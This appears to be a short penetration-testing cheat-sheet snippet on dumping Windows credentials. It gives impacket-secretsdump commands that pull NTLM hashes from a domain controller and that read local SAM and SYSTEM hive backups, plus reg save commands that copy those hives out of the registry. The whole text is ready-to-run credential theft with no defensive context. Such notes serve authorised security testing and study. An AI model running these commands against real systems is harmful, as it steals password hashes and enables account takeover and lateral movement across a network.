```Shell
impacket-secretsdump -just-dc-ntlm domain.local/user@dc_1.2.3.4
```


```Shell
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

To take sam.bak and system.bak:
```CMD
reg save hklm\sam sam.bak
reg save hklm\system system.bak
```
